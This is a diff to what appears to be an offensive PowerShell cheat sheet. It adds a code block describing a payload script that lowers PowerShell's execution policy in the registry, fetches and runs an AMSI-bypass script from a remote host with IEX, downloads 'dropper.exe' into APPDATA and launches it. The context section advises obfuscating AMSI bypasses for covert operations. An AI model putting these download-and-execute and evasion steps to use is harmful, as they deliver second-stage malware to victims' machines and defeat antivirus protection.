@@ -127,6 +127,30 @@ $parameters=@("arg1", "arg2")
 ```
 
 
+
+```powershell
+First, the payload script would change PowerShell’s running configuration so the current user would be allowed to execute PowerShell scripts with no restrictions, using the following command:
+
+New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value "Unrestricted" -PropertyType String -Force
+$wr = [System.NET.webRequest]::Create('http://192.168.1.125/AMSI-bypass.ps1')
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+
+The script then proceeds to download a Windows executable file from a remote server, using .NET’s WebClient class:
+
+$ProcName = "dropper.exe"
+$wc = [System.Net.WebClient]::new()
+$wc.DownloadFile("http://62[.]182[.]84[.]61/$ProcName", "$env:APPDATA\$ProcName")
+$wc.Dispose()
+
+Finally, the payload script executes the downloaded binary (which we will refer to as the “2nd stage payload”), after clearing the script’s output from the screen:
+
+Clear-Host
+Start-Process ("$env:APPDATA\$ProcName")
+
+```
+
+
 ### 3) Powershell AMSI Bypass
 
 Patching AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an __AMSI bypass__ altogether by altering your scripts to beat signature-based detection.
